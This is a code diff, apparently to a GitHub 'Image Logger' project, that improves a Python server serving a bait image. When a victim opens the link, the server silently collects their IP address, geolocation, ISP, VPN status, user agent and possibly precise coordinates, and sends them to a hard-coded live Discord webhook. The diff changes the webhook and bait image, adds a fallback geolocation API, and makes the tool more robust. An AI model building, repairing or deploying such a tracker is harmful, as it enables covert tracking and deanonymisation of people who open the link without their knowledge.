@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1454347701717045432/Mux0DaY_cfs4OSgOHLKFmabWEvkSvwzQOuX3rMtOxdGWhqtYyF0caxjqrWvsgrIm1nui",
-    "image": "https://i.ytimg.com/vi/6mOcNbLXhqk/maxresdefault.jpg",
+    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
     "imageArgument": True,
 
     # CUSTOMIZATION #
@@ -68,8 +68,50 @@ def reportError(error):
     except:
         pass
 
+def getIPInfo(ip):
+    """Lấy thông tin IP với fallback"""
+    try:
+        # API chính
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
+        if info.get("status") != "fail":
+            return info
+    except:
+        pass
+    
+    try:
+        # API dự phòng
+        info = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
+        if "error" not in info:
+            # Chuyển đổi định dạng để tương thích
+            return {
+                "isp": info.get("org", "Unknown"),
+                "as": info.get("asn", "Unknown"),
+                "country": info.get("country_name", "Unknown"),
+                "regionName": info.get("region", "Unknown"),
+                "city": info.get("city", "Unknown"),
+                "lat": info.get("latitude", "Unknown"),
+                "lon": info.get("longitude", "Unknown"),
+                "timezone": info.get("timezone", "Unknown"),
+                "mobile": info.get("mobile", False),
+                "proxy": info.get("proxy", False),
+                "hosting": info.get("hosting", False),
+                "status": "success"
+            }
+    except:
+        pass
+    
+    return {"status": "fail", "message": "Could not fetch IP info"}
+
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     try:
+        # Chặn IP nội bộ và localhost
+        if ip.startswith(("127.", "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", 
+                         "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", 
+                         "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", 
+                         "169.254.", "::1", "fc00:", "fd00:", "fe80:")):
+            print(f"[INFO] Blocked internal IP: {ip}")
+            return None
+        
         if ip.startswith(blacklistedIPs):
             return None
         
@@ -89,10 +131,26 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             return None
 
         ping = "@everyone"
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+        info = getIPInfo(ip)
         
         if info.get("status") == "fail":
-            return None
+            # Gửi embed đơn giản khi API fail
+            embed = {
+                "username": config["username"],
+                "content": "@everyone",
+                "embeds": [{
+                    "title": "Image Logger - IP Logged (Limited Info)",
+                    "color": config["color"],
+                    "description": f"""**A User Opened the Original Image!**
+
+**IP:** `{ip}`
+**Endpoint:** `{endpoint}`
+**User Agent:** ```{useragent[:500] if useragent else 'Unknown'}```
+**Note:** Limited information available for this IP""",
+                }],
+            }
+            requests.post(config["webhook"], json=embed)
+            return info
             
         if info.get("proxy", False):
             if config["vpnCheck"] == 2:
@@ -116,7 +174,20 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             elif config["antiBot"] == 1:
                 ping = ""
 
-        os, browser = httpagentparser.simple_detect(useragent)
+        try:
+            os, browser = httpagentparser.simple_detect(useragent)
+        except:
+            os, browser = "Unknown", "Unknown"
+        
+        # Xử lý timezone an toàn
+        timezone_str = "Unknown"
+        timezone = info.get('timezone', '')
+        if timezone and '/' in timezone:
+            try:
+                parts = timezone.split('/')
+                timezone_str = f"{parts[1].replace('_', ' ')} ({parts[0]})"
+            except:
+                timezone_str = "Unknown"
         
         embed = {
             "username": config["username"],
@@ -130,16 +201,16 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Provider:** `{info.get('isp', 'Unknown')}`
+> **ASN:** `{info.get('as', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Coords:** `{f"{info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}" if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords.replace(' ', '+') + ')'})
+> **Timezone:** `{timezone_str}`
+> **Mobile:** `{info.get('mobile', 'Unknown')}`
+> **VPN:** `{info.get('proxy', 'Unknown')}`
+> **Bot:** `{'Yes' if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'No'}`
 
 **PC Info:**
 > **OS:** `{os}`
@@ -147,11 +218,11 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
 **User Agent:**
 ```
-{useragent}
+{useragent[:950] if useragent else 'Unknown'}
 ```""",
-    }
-  ],
-}
+            }],
+        }
+        
         if url:
             embed["embeds"][0]["thumbnail"] = {"url": url}
         
@@ -159,7 +230,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         return info
         
     except Exception as e:
-        reportError(str(e))
+        print(f"[ERROR] makeReport: {str(e)}")
+        reportError(traceback.format_exc())
         return None
 
 binaries = {
@@ -174,7 +246,10 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode((dic.get("url") or dic.get("id")).encode()).decode()
+                    try:
+                        url = base64.b64decode((dic.get("url") or dic.get("id")).encode()).decode()
+                    except:
+                        url = config["image"]
                 else:
                     url = config["image"]
             else:
@@ -193,7 +268,8 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
-            # Get IP address
+            # Get IP address safely
+            ip = "Unknown"
             if self.headers.get('x-forwarded-for'):
                 ip = self.headers.get('x-forwarded-for').split(',')[0].strip()
             else:
@@ -202,14 +278,14 @@ height: 100vh;
             useragent = self.headers.get('user-agent', 'Unknown')
             endpoint = self.path.split('?')[0] if '?' in self.path else self.path
             
-            if ip.startswith(blacklistedIPs):
+            if ip != "Unknown" and ip.startswith(blacklistedIPs):
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
                 self.wfile.write(data)
                 return
             
-            if botCheck(ip, useragent):
+            if ip != "Unknown" and botCheck(ip, useragent):
                 self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
@@ -234,10 +310,11 @@ height: 100vh;
             
             # Run report in thread
             result = None
-            if coords:
-                result = makeReport(ip, useragent, coords, endpoint, url)
-            else:
-                result = makeReport(ip, useragent, None, endpoint, url)
+            if ip != "Unknown":
+                if coords:
+                    result = makeReport(ip, useragent, coords, endpoint, url)
+                else:
+                    result = makeReport(ip, useragent, None, endpoint, url)
             
             # Prepare message
             message = config["message"]["message"]
@@ -254,8 +331,11 @@ height: 100vh;
                 
                 timezone = result.get("timezone", "Unknown")
                 if timezone != "Unknown" and '/' in timezone:
-                    tz_parts = timezone.split('/')
-                    message = message.replace("{timezone}", f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})")
+                    try:
+                        tz_parts = timezone.split('/')
+                        message = message.replace("{timezone}", f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})")
+                    except:
+                        message = message.replace("{timezone}", "Unknown")
                 else:
                     message = message.replace("{timezone}", "Unknown")
                     
@@ -307,6 +387,7 @@ if (!currenturl.includes("g=")) {
             self.wfile.write(data)
         
         except Exception as e:
+            print(f"[ERROR] handleRequest: {str(e)}")
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
